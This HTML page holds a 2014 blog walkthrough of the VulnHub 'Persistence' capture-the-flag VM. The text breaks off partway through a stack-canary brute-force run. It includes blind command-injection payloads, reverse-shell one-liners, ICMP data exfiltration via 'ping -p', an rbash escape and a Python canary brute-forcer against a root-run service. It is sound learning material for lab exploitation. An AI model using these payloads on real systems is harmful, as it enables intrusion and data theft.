<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>From Persistence | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="persist we must!
Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.
This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/09/18/from-persistence/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="From Persistence">
<meta property="og:description" content="persist we must!
Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.
This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/09/18/from-persistence/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-09-18T06:58:53+00:00">
<meta property="article:modified_time" content="2014-09-18T06:58:53+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="From Persistence">
<meta name=twitter:description content="persist we must!
Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.
This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"From Persistence","item":"https://leonjza.github.io/blog/2014/09/18/from-persistence/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"From Persistence","name":"From Persistence","description":"persist we must! Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.\nThis is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go \u0026ldquo;meh, next\u0026rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!\n","keywords":[],"articleBody":"persist we must! Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a writeup competition launched on September the 7th, and ran up until October th 5th.\nThis is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go “meh, next”. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!\nlets get our hands dirty As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.\nMy VM got the IP 192.168.56.104, and the first Nmap result was:\nroot@kali:~# nmap 192.168.56.104 --reason -sV -p- Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST Nmap scan report for 192.168.56.104 Host is up, received reset (0.0037s latency). Not shown: 65534 filtered ports Reason: 65534 no-responses PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.4.7 Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.\nBrowsing to the site did not reveal anything interesting. A creepy image of melting clocks (what…) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.\nBy default, most web servers will serve the default index page when no location is specified from the web root. So, I tried index.html, and got the normal landing. When I requested index.php though, things changed drastically:\nroot@kali:~# curl -v 192.168.56.104/index.php * About to connect() to 192.168.56.104 port 80 (#0) * Trying 192.168.56.104... * connected * Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)  GET /index.php HTTP/1.1  User-Agent: curl/7.26.0  Host: 192.168.56.104  Accept: */* * additional stuff not fine transfer.c:1037: 0 0 * HTTP 1.1 or later with persistent connection, pipelining supported 404 Not Found 18 Sep 2014 07:28:18 GMT #0 to host 192.168.56.104 left intact * Closing connection #0 As can be seen in the output above, the header X-Powered-By: PHP/5.3.3 is now present, and the output No input file specified.. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.\nfinding that (de)bugger With this information now gathered, it was time to pull out one of my favorite tools, wfuzz! With wfuzz, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.\nMy first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending .php to my FUZZ keyword:\nroot@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php ******************************************************** * Wfuzz 2.0 - The Web Bruteforcer * ******************************************************** Target: http://192.168.56.104/FUZZ.php Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt Total requests: 1660 ================================================================== ID Response Lines Word Chars Request ================================================================== 00434: C=200 12 L 28 W 357 Ch \" - debug\" Yay. wfuzz is stupidly fast and finished the above in like 4 seconds. Browsing to http://192.168.56.101/debug.php showed us a input field labeled “Ping address:” and a submit button\n  “Command injection?”, was the first thought here.\nblind command injection I started by entering a valid IP address that had tcpdump listening to test if the script is actually running a ping like it says …\nroot@kali:~# tcpdump icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 07:46:15.503023 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 64004, seq 1, length 64 07:46:15.503040 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64 07:46:16.503729 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 64004, seq 2, length 64 07:46:16.503768 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64 07:46:17.503180 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 64004, seq 3, length 64 07:46:17.503260 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64 07:46:18.502811 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 64004, seq 4, length 64 07:46:18.502842 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64 … which it was. What is important to note here is that we have 4 echo requests.\nI then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field ;exit 0; caused the HTTP request to complete almost instantly while no ping requests were observed on the tcpdump. This had me certain that this field was vulnerable to a command injection vulnerability.\nThis is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.\nI tried the usual culprits: nc   -e /bin/bash; bash -i \u0026 /dev/tcp// 0\u00261; php -r '$sock=fsockopen(\"\",);exec(\"/bin/sh -i \u00263 2\u00263\");'. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?\nblind command injection - file enumeration Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.\nI thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash if [ -f /file ] statement, with a single ping for success, and 2 pings for a failure. The string for the debug.php input field looked something like this:\n;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi Submitting the above input presented me with a single ping, confirming that /bin/sh exists.\nroot@kali:~# tcpdump icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 08:15:53.557994 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 63493, seq 1, length 64 08:15:53.558011 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64 Checking for something like /bin/sh2 responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as /bin/nc, I may end up with greater success of a shell!\nI continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless, /usr/bin/python appeared to be available! I really like python so this had me really happy.\nblind command injection - port scanner I tested a few commands with python -c, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.\nNo. Luck.\nI no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port ‘prober’ so that I can try and determine which port is open outgoing. The idea was to watch my tcpdump for any tcp traffic comming from this host:\nimport socket for port in xrange(1, 65535): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(0.1) sock.connect_ex((\"192.168.56.102\", port)) sock.close() Using my blind command injection, I echoed this content to /tmp/probe.py via the input field, and then in a subsequent request, ran it using python /tmp/probe.py. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open…\ndata exfiltration With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the debug.php file on disk and tried to echo a PHP web shell to the same directory. This also failed.\nSo, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.\nEventually, I came across the -p argument for ping after reading this blogpost. From man 8 ping we read:\n-p pattern You may specify up to 16 ``pad'' bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, ``-p ff'' will cause the sent packet to be filled with all ones. So that changes things. I quickly confirmed that we have xxd available using my previous enumeration method and we did. Great.\nI fired up tcpdump with the -X flag to show me the packet contents, and tested it out with the following payload for the id command:\n;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done On the tcpdump side of things…\nroot@kali:~/Desktop# tcpdump icmp -X tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 09:18:14.439222 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 6920, seq 1, length 64 0x0000: 4500 0054 0000 4000 4001 488a c0a8 3868 E..T..@.@.H...8h 0x0010: c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54 ..8f..K[....V..T 0x0020: f357 0a00 6e67 696e 7829 2067 7569 643d .W..nginx).guid= 0x0030: 3439 3828 6e67 696e 7829 2067 7569 643d 498(nginx).guid= 0x0040: 3439 3828 6e67 696e 7829 2067 7569 643d 498(nginx).guid= 0x0050: 3439 3828 498( 09:18:14.439248 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64 0x0000: 4500 0054 a049 0000 4001 e840 c0a8 3866 E..T.I..@..@..8f 0x0010: c0a8 3868 0000 535b 1b08 0001 56a3 1a54 ..8h..S[....V..T 0x0020: f357 0a00 6e67 696e 7829 2067 7569 643d .W..nginx).guid= 0x0030: 3439 3828 6e67 696e 7829 2067 7569 643d 498(nginx).guid= 0x0040: 3439 3828 6e67 696e 7829 2067 7569 643d 498(nginx).guid= 0x0050: 3439 3828 498( 09:18:14.440365 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 7176, seq 1, length 64 0x0000: 4500 0054 0000 4000 4001 488a c0a8 3868 E..T..@.@.H...8h 0x0010: c0a8 3866 0800 318a 1c08 0001 56a3 1a54 ..8f..1.....V..T 0x0020: e35a 0a00 6769 6e78 2920 6772 6964 3d34 .Z..ginx).grid=4 0x0030: 3938 286e 6769 6e78 2920 6772 6964 3d34 98(nginx).grid=4 0x0040: 3938 286e 6769 6e78 2920 6772 6964 3d34 98(nginx).grid=4 0x0050: 3938 286e 98(n 09:18:14.440382 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64 0x0000: 4500 0054 a04a 0000 4001 e83f c0a8 3866 E..T.J..@..?..8f 0x0010: c0a8 3868 0000 398a 1c08 0001 56a3 1a54 ..8h..9.....V..T 0x0020: e35a 0a00 6769 6e78 2920 6772 6964 3d34 .Z..ginx).grid=4 0x0030: 3938 286e 6769 6e78 2920 6772 6964 3d34 98(nginx).grid=4 0x0040: 3938 286e 6769 6e78 2920 6772 6964 3d34 98(nginx).grid=4 0x0050: 3938 286e 98(n 09:18:14.441191 IP 192.168.56.104  192.168.56.102: ICMP echo request, id 7432, seq 1, length 64 0x0000: 4500 0054 0000 4000 4001 488a c0a8 3868 E..T..@.@.H...8h 0x0010: c0a8 3866 0800 ed92 1d08 0001 56a3 1a54 ..8f........V..T 0x0020: f95d 0a00 286e 6769 6e78 290a 6f75 7073 .]..(nginx).oups 0x0030: 3d34 3938 286e 6769 6e78 290a 6f75 7073 =498(nginx).oups 0x0040: 3d34 3938 286e 6769 6e78 290a 6f75 7073 =498(nginx).oups 0x0050: 3d34 3938 =498 09:18:14.441198 IP 192.168.56.102  192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64 0x0000: 4500 0054 a04b 0000 4001 e83e c0a8 3866 E..T.K..@....8f 0x0010: c0a8 3868 0000 f592 1d08 0001 56a3 1a54 ..8h........V..T 0x0020: f95d 0a00 286e 6769 6e78 290a 6f75 7073 .]..(nginx).oups 0x0030: 3d34 3938 286e 6769 6e78 290a 6f75 7073 =498(nginx).oups 0x0040: 3d34 3938 286e 6769 6e78 290a 6f75 7073 =498(nginx).oups 0x0050: 3d34 3938 =498 Mind. Blown.\nIn case you don’t see it, we have extracts of the id command in the request/response packets like 98(nginx).grid=4. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact something to work with!\nI fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.\n sniff(filter=\"icmp[icmptype] == 8 and host 192.168.56.104\", prn=lambda x: x.load) ؤ\u001aT�nginx) guid=498(nginx) guid=498(nginx) guid=498( ؤ\u001aT ginx) grid=498(nginx) grid=498(nginx) grid=498(n ؤ\u001aT�(nginx) oups=498(nginx) oups=498(nginx) oups=498 sysadmin-tool So with actual output to work with, I can almost say I have shell, however, it’s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.\nAt one stage I ran ls as the command trying to see if there was anything in the web path that I may not have found yet. A file called sysadmin-tool was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through strings:\nroot@kali:~# strings sysadmin-tool /lib/ld-linux.so.2 __gmon_start__ libc.so.6 _IO_stdin_used chroot strncmp puts setreuid mkdir rmdir chdir system __libc_start_main GLIBC_2.0 PTRh [^_] Usage: sysadmin-tool --activate-service --activate-service breakout /bin/sed -i 's/^#//' /etc/sysconfig/iptables /sbin/iptables-restore From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:\n;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done root@kali:~# nmap 192.168.56.104 --reason -sV -p- Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST Nmap scan report for 192.168.56.104 Host is up, received reset (0.0017s latency). Not shown: 65533 filtered ports Reason: 65533 no-responses PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 5.3 (protocol 2.0) 80/tcp open http syn-ack nginx 1.4.7 Service detection performed. Please report any incorrect results at http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds Yay! SSH.\nshell and breakout as avida Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:\nroot@kali:~/Desktop/persistence# ssh avida@192.168.56.104 The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established. RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts. avida@192.168.56.104's password: # dollars Last login: Thu Sep 18 05:57:30 2014 -rbash-4.1$ Op success. Or is it? I immediately noticed the prompt as rbash, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a / in them.\n-rbash-4.1$ /bin/bash -rbash: /bin/bash: restricted: cannot specify `/' in command names So the next logical step was to attempt ‘breaking out’ of this shell so that I can have a better look around. I was able to cat say /etc/passwd, but that only gets you that far :P\nAfter quite some time and some research, it became apparent that the well known breakouts from rbash are not possible. I was unable to edit my PATH, change files and re-login or use the classic vi :shell breakout. Eventually (and out of desperation), I focussed my attention to ftp. Opening ftp, and typing help at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:\n-rbash-4.1$ ftp ftp ! +rbash-4.1$ /bin/bash bash-4.1$ I got dropped into another rbash shell, however this time with a +. So, I went for /bin/bash and… w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!\nthe wopr game During the enumeration done while still stuck with rbash, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of netstat. Opening a telnet session to this port presented you with a ‘game’:\nbash-4.1$ telnet 127.0.0.1 3333 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. [+] hello, my name is sploitable [+] would you like to play a game?  yes! [+] yeah, I don't think so [+] bye! Connection closed by foreign host. bash-4.1$ I asked really, really nicely, but no matter how polite I was, it would just not let me play!\nFurther inspection showed that the game was possibly run as root from /usr/local/bin/wopr\nbash-4.1$ ps -ef | grep wopr root 1005 1 0 05:42 ? 00:00:00 /usr/local/bin/wopr root 1577 1005 0 06:43 ? 00:00:00 [wopr]  avida 1609 1501 0 06:47 pts/0 00:00:00 grep wopr bash-4.1$ ls -lah /usr/local/bin/wopr -rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr wopr was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:\n# first, hex encode the file bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr 7f454c460101010000000000000000000200030001000000c08604083400000080110000 0000000034002000090028001e001b000600000034000000348004083480040820010000 [... snip ...] 38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400 bash-4.1$ # next, I copied the xxd output from the persistence terminal # and pasted it into a file called wopr.xxd. Then reverted it # and redirected the output to `wopr` root@kali:~# cat wopr.xxd | xxd -r -p  wopr The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all…\nwopr, stack smashing Poking around the binary, I mostly used gdb along with peda. Checksec revealed that this binary was compiled with quite a few security features built in.\nroot@kali:~# gdb -q ./wopr Reading symbols from persistence/wopr...(no debugging symbols found)...done. gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.\nWith all of that in mind, I ran the binary with the r command, and made a new telnet session to it.\ngdb-peda$ r [+] bind complete [+] waiting for connections [+] logging queries to $TMPLOG [+] got a connection [New process 26936] [Inferior 2 (process 26936) exited normally] Warning: not running or target is remote gdb-peda$ When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a fork()\ngdb-peda$ disass main Dump of assembler code for function main: [.. snip ..] 0x080489fd : mov DWORD PTR [esp],0x8048cb2 0x08048a04 : call 0x804866c  0x08048a09 : call 0x804867c  #  0x08048a0e : test eax,eax 0x08048a10 : jne 0x8048b0e  0x08048a16 : mov DWORD PTR [esp+0x8],0x21 0x08048a1e : mov DWORD PTR [esp+0x4],0x8048cc8 0x08048a26 : mov eax,DWORD PTR [ebp-0x22c] 0x08048a2c : mov DWORD PTR [esp],eax 0x08048a2f : call 0x804858c  [.. snip ..] End of assembler dump. gdb-peda$ Why is the fork() so important!? We will see in a bit just hang on. :)\nSo back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D\nSending 30 x A’s results in:\ngdb-peda$ [+] got a connection *** stack smashing detected ***: wopr terminated ======= Backtrace: ========= /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0] /lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a] wopr[0x80487dc] wopr[0x8048ad6] /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36] wopr[0x80486e1] ======= Memory map: ======== 08048000-08049000 r-xp 00000000 08:01 1184792 wopr 08049000-0804a000 r--p 00000000 08:01 1184792 wopr 0804a000-0804b000 rw-p 00001000 08:01 1184792 wopr 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e3b000-b7e57000 r-xp 00000000 08:01 1573598 /lib/i386-linux-gnu/libgcc_s.so.1 b7e57000-b7e58000 rw-p 0001b000 08:01 1573598 /lib/i386-linux-gnu/libgcc_s.so.1 b7e73000-b7e74000 rw-p 00000000 00:00 0 b7e74000-b7fbd000 r-xp 00000000 08:01 1580474 /lib/i386-linux-gnu/libc-2.13.so b7fbd000-b7fbe000 ---p 00149000 08:01 1580474 /lib/i386-linux-gnu/libc-2.13.so b7fbe000-b7fc0000 r--p 00149000 08:01 1580474 /lib/i386-linux-gnu/libc-2.13.so b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474 /lib/i386-linux-gnu/libc-2.13.so b7fc1000-b7fc4000 rw-p 00000000 00:00 0 b7fde000-b7fe1000 rw-p 00000000 00:00 0 b7fe1000-b7fe2000 r-xp 00000000 00:00 0 [vdso] b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852 /lib/i386-linux-gnu/ld-2.13.so b7ffe000-b7fff000 r--p 0001b000 08:01 1579852 /lib/i386-linux-gnu/ld-2.13.so b7fff000-b8000000 rw-p 0001c000 08:01 1579852 /lib/i386-linux-gnu/ld-2.13.so bffdf000-c0000000 rw-p 00000000 00:00 0 [stack] So it looks like we may have a buffer overflow here. What is important though is the backtrace shows that the last fail was in __fortify_fail. __fortify_fail is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the checksec output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.\nBut lets not stop there. I continued to place more A’s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A’s, the backtrace had a full 4 bytes of 41.\n[+] got a connection *** stack smashing detected ***: wopr terminated ======= Backtrace: ========= /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0] /lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a] wopr[0x80487dc] [0x41414141] #Was this where EIP was? With the debugging we have done thus far, lets assume that the stack layout looks something like this:\n- - - - [42 Bytes in Total] - - -  [ 30 Bytes Data ] [ Cookie ] [ 4 Bytes ] [ EIP ] - - - - [42 Bytes in Total] - - -  wopr - stack canary bruteforce This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.\nA lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was\n Phrack Issue 67 The Art Of ELF: Analysis and Exploitations Fusion level04 write-up (SPOILER ALERTS for another CTF)  Now, remember I mentioned fork() earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of fork() and how this affects stack cookies.\nFrom man 2 fork’s description:\nDESCRIPTION Fork() causes creation of a new process. The new process (child process) is an exact copy of the calling process (parent process) except for the following: [.. snip ..] What this means for us then is that every time we have a new fork() happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. ”Soooooooo what?” I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!\nThe theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of wopr, I can just watch the console output, however, I don’t have that luxury on the Persistence VM!\nWhile thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) - xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!\nWhen a string of less than 30 A’s is sent, the server will send a “[+] bye!” message before closing the socket. More than 30 A’s, and the socket is killed before the bye\nroot@kali:~# telnet 127.0.0.1 3333 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. [+] hello, my name is sploitable [+] would you like to play a game?  A [+] yeah, I don't think so [+] bye! # Connection closed by foreign host. root@kali:~# telnet 127.0.0.1 3333 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. [+] hello, my name is sploitable [+] would you like to play a game?  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [+] yeah, I don't think so Connection closed by foreign host. # This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word bye in the last socket receive to know if we have succeeded or not. The resultant script was therefore:\nimport socket import sys payload = \"A\" * 30 # amount of bytes before the first canary bit is hit canary = \"\" # the canary # start the canary brute loop. We want to brute 4 bytes ... for x in xrange(1,5): # ... and try all possibilities for canary_byte in xrange(0, 256): # prepare the byte hex_byte = chr(canary_byte) # prepare the payload send = payload + canary + hex_byte print \"[+] Trying: '\\\\x{0}' in payload '%s' (%d:%d/255)\".format(hex_byte.encode(\"hex\")) % (send, x, canary_byte) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('127.0.0.1', 3333)) # get the inital banners sock.recv(35) # [+] hello, my name is sploitable\\n sock.recv(40) # [+] would you like to play a game?\\n sock.recv(5) #  # send the payload sock.send(send) sock.recv(27) # [+] yeah, I don't think so\\n # if we have a OK response, then we will have this last part # as '[+] bye!\\n' populated, if its wrong, not data = sock.recv(64) # [+] bye!\\n if \"bye\" in data: print \"[!!] Found a possible canary value of '{0}'!\".format(hex_byte.encode(\"hex\")) canary += hex_byte sock.close() break sock.close() # if we cant even find the first byte, we failed already if len(canary)  0: print \"[-] Unable to even find the first bit. No luck\" sys.exit(0) if len(canary)  0: print \"[+] Canary seems to be {0}\".format(canary.encode(\"hex\")) else: print \"[-] Unable to brute canary\" An example run of this would end as follows:\n[+] Trying: '\\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255) [+] Trying: '\\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255) [+] Trying: '\\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255) [+] Trying: '\\x90' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:144/255) [!!] Found a possible 